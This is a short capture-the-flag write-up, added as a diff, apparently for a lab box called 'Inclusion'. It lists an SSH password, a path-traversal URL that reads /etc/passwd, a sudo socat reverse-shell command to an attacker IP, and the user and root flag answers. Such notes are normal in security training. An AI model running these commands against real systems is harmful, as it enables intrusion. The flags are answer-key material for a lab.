@@ -1,0 +1,19 @@
+                                        INCLUSION
+
+           ssh password=falconfeast
+
+            http://10.10.187.181/article?name=../../../../etc/passwd
+
+
+        # TASK 1
+
+        1. DEPLOYED
+
+
+        # TASK 2
+
+        1. USER FLAG=60989655118397345799
+
+        sudo  socat tcp-connect:10.9.10.45:1234 exec:/bin/sh,pty,stderr,setsid,sigint,sane
+        
+        2. ROOT FLAG=42964104845495153909
